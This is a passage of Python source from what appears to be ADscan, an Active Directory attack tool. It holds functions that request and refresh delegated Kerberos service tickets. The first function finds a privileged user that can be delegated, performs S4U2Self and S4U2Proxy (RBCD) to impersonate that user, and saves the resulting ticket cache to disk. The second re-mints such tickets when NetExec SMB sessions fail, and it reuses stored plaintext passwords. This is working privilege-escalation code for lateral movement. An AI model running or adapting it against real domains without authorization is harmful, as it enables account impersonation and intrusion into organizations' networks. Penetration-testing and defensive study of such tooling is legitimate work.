    """Request a delegated service ticket directly via getST.py.

    This is the preferred path for RBCD against computer targets. Unlike the
    legacy S4Proxy wrapper, it does not depend on an intermediate browser/DC
    ccache and instead asks Impacket directly for the final service ticket.
    """

    previous_result = getattr(shell, "_last_delegation_launch_result", None)
    aggregated_ticket_paths: dict[str, str] = {}
    if isinstance(previous_result, dict):
        raw_previous_paths = previous_result.get("ticket_paths")
        if isinstance(raw_previous_paths, dict):
            aggregated_ticket_paths = {
                str(key).strip(): str(value).strip()
                for key, value in raw_previous_paths.items()
                if str(key).strip() and str(value).strip()
            }

    setattr(shell, "_last_delegation_launch_result", None)
    setattr(
        shell,
        "_last_delegation_launch_context",
        {
            "domain": domain,
            "target_spn": target_spn,
            "target_spns": sorted({*aggregated_ticket_paths.keys(), target_spn}),
            "username": username,
            "password": password,
            "force_forwardable": force_forwardable,
        },
    )
    try:
        target_user = shell.get_delegatable_privileged_user(domain)
        if not target_user:
            setattr(
                shell,
                "_last_delegation_launch_result",
                {
                    "success": False,
                    "target_spn": target_spn,
                    "ticket_paths": aggregated_ticket_paths,
                    "target_user": None,
                    "ticket_path": None,
                    "error": "No privileged user found that can be delegated",
                },
            )
            print_error("No privileged user found that can be delegated")
            return False

        marked_spn = mark_sensitive(target_spn, "service")
        print_success(f"Requesting delegated service ticket for {marked_spn}")

        # Native kerbad S4U2Self+S4U2Proxy.
        ccache_path = os.path.join(
            shell._get_workspace_cwd(),
            f"{target_user}@{target_spn.replace('/', '_')}.{domain.upper()}.ccache",
        )
        native = _run_s4u_native(
            shell,
            domain=domain,
            username=username,
            password=password,
            impersonate_user=target_user,
            service_spn=target_spn,
            ccache_output_path=ccache_path,
        )
        ticket = native.ticket_path if native.success else None
        if ticket:
            aggregated_ticket_paths[target_spn] = ticket
        setattr(
            shell,
            "_last_delegation_launch_result",
            {
                "success": native.success,
                "target_spn": target_spn,
                "target_user": target_user,
                "ticket_path": ticket,
                "ticket_paths": aggregated_ticket_paths,
                "error": native.error_message if not native.success else None,
            },
        )
        if native.success:
            print_success("Delegated service ticket created successfully")
            return True
        print_error(
            str(
                native.error_message or "Error requesting delegated service ticket."
            )
        )
        return False

    except Exception as e:
        setattr(
            shell,
            "_last_delegation_launch_result",
            {
                "success": False,
                "target_spn": target_spn,
                "ticket_paths": aggregated_ticket_paths,
                "target_user": None,
                "ticket_path": None,
                "error": str(e),
            },
        )
        telemetry.capture_exception(e)
        print_error("Error requesting delegated service ticket.")
        print_exception(show_locals=False, exception=e)
        return False


def refresh_last_delegated_service_ticket(
    shell: DelegationShell,
    *,
    current_ticket_path: str | None = None,
) -> str | None:
    """Recreate the most recent delegated service ticket and return its new path.

    This is used by NetExec recovery logic when a delegated SMB session fails
    with ``STATUS_MORE_PROCESSING_REQUIRED`` and ADscan still has the context
    needed to mint a fresh ticket.
    """
    context = getattr(shell, "_last_delegation_launch_context", None)
    if not isinstance(context, dict):
        print_warning(
            "ADscan cannot refresh this delegated ticket automatically because "
            "the original delegation context is no longer available."
        )
        return None

    previous_result = getattr(shell, "_last_delegation_launch_result", None)
    previous_ticket_path = None
    previous_ticket_paths: dict[str, str] = {}
    if isinstance(previous_result, dict):
        previous_ticket_path = (
            str(previous_result.get("ticket_path") or "").strip() or None
        )
        raw_ticket_paths = previous_result.get("ticket_paths")
        if isinstance(raw_ticket_paths, dict):
            previous_ticket_paths = {
                str(key).strip(): str(value).strip()
                for key, value in raw_ticket_paths.items()
                if str(key).strip() and str(value).strip()
            }

    requested_ticket_path = str(current_ticket_path or "").strip() or None
    known_ticket_paths = {
        os.path.abspath(path)
        for path in ([previous_ticket_path] if previous_ticket_path else [])
        if path
    }
    known_ticket_paths.update(
        os.path.abspath(path) for path in previous_ticket_paths.values() if path
    )
    if (
        requested_ticket_path
        and known_ticket_paths
        and os.path.abspath(requested_ticket_path) not in known_ticket_paths
    ):
        print_warning(
            "ADscan detected a delegated ticket mismatch and will not refresh "
            "an unrelated Kerberos cache automatically."
        )
        return None

    domain = str(context.get("domain") or "").strip()
    target_spn = str(context.get("target_spn") or "").strip()
    raw_target_spns = context.get("target_spns")
    if isinstance(raw_target_spns, list):
        target_spns = [
            str(item).strip() for item in raw_target_spns if str(item).strip()
        ]
    else:
        target_spns = [target_spn] if target_spn else []
    username = str(context.get("username") or "").strip()
    password = str(context.get("password") or "")
    force_forwardable = bool(context.get("force_forwardable", True))

    if not domain or not target_spns or not username or not password:
        print_warning(
            "ADscan cannot refresh this delegated ticket because the saved "
            "delegation context is incomplete."
        )
        return None

    for next_target_spn in target_spns:
        marked_spn = mark_sensitive(next_target_spn, "service")
        print_info(f"Refreshing delegated service ticket for {marked_spn}.")
        success = request_delegated_service_ticket(
            shell,
            domain,
            next_target_spn,
            username,
            password,
            force_forwardable=force_forwardable,
        )
        if not success:
            return None

    refreshed_result = getattr(shell, "_last_delegation_launch_result", None)
    if not isinstance(refreshed_result, dict):
        return None
    refreshed_ticket_paths = refreshed_result.get("ticket_paths")
    if requested_ticket_path and isinstance(refreshed_ticket_paths, dict):
        previous_match = None
        for spn, prior_path in previous_ticket_paths.items():
            if os.path.abspath(str(prior_path)) == os.path.abspath(
                requested_ticket_path
            ):
                previous_match = str(spn).strip()
                break
        if previous_match:
            refreshed_match = str(
                refreshed_ticket_paths.get(previous_match) or ""
            ).strip()
            if refreshed_match:
                return refreshed_match
    return str(refreshed_result.get("ticket_path") or "").strip() or None
